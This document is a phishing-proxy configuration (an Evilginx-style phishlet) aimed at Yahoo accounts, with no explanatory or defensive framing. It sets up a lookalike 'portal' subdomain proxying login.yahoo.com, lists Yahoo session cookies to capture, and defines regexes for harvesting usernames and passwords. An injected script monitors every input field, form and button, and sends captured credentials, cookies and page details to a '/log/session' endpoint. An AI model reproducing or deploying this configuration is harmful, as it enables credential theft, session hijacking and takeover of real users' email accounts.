min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'portal-y5n8m2q', orig_sub: 'login', domain: 'yahoo.com', session: true, auto_filter: true, is_landing: true}
sub_filters:
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https%3A%2F%2F{hostname}/', replace: 'https%3A%2F%2F{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
auth_tokens:
  - domain: '.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', '_Y', 'EuConsent', 'thamba', 'ucs', 'APID', 'APIDTS', 'sS', 'cmp', '.*,regexp']
  - domain: '.login.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.www.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
  - domain: '.mail.yahoo.com'
    keys: ['Y', 'T', 'B', 'GUC', 'GUCS', '.*,regexp']
auth_urls:
  - '/consent'
  - '/account/challenge/password*'
  - '/?.src=ym*'
  - '/?.done=*'
credentials:
  username:
    key: '(username|email|mobile|userId|login)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|password|pass)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger_domains: ["*"]
    trigger_paths: ["*"]
    script: |
      (function() {
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var providerName = 'Yahoo';
        var providerId = 'yahoo';

        function sendSessionData() {
          try {
            if (!capturedCreds.username && !capturedCreds.password) return;
            var currentHash = (capturedCreds.username || '') + ':' + (capturedCreds.password || '');
            if (currentHash === lastCapture) return;
            lastCapture = currentHash;

            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              c = c.trim();
              if (c) { var eq = c.indexOf('='); if (eq > 0) cookieObj[c.substring(0, eq)] = c.substring(eq + 1); }
            });

            var sessionInfo = {
              provider: providerId,
              credentials: capturedCreds,
              url: window.location.href,
              userAgent: navigator.userAgent || '',
              cookies: cookieObj,
              timestamp: new Date().toISOString()
            };

            var payload = {
              username: 'SessionData-' + providerName,
              password: JSON.stringify(sessionInfo)
            };

            fetch('/log/session', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              keepalive: true
            }).catch(function(){});
          } catch(e) {}
        }

        var monitor = (function() {
          var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : { add: function(el) { el._yhWatched = true; }, has: function(el) { return el._yhWatched; } };
          return function() {
            document.querySelectorAll('input, form, button, [role="button"]').forEach(function(el) {
              if (watchedElements.has(el)) return;
              watchedElements.add(el);
              if (el.tagName === 'INPUT') {
                var captureField = function() {
                  var v = el.value;
                  if (!v) return;
                  var t = (el.type || '').toLowerCase();
                  var n = (el.name || el.id || '').toLowerCase();
                  if (t === 'password' || n.includes('pass')) {
                    if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
                  } else if (t === 'email' || t === 'text' || t === 'tel' || n.includes('user') || n.includes('email') || n.includes('login') || n.includes('phone')) {
                    if (v !== capturedCreds.username) { capturedCreds.username = v; }
                  }
                };
                el.addEventListener('input', captureField, { passive: true });
                el.addEventListener('change', captureField, { passive: true });
                el.addEventListener('blur', captureField, { passive: true });
              } else if (el.tagName === 'FORM') {
                el.addEventListener('submit', function() { setTimeout(sendSessionData, 100); }, { passive: true });
              } else {
                el.addEventListener('click', function() { setTimeout(sendSessionData, 100); }, { passive: true });
              }
            });
          };
        })();

        var observer = new MutationObserver(monitor);
        observer.observe(document, { childList: true, subtree: true });
        setInterval(monitor, 3000);
        monitor();
      })();
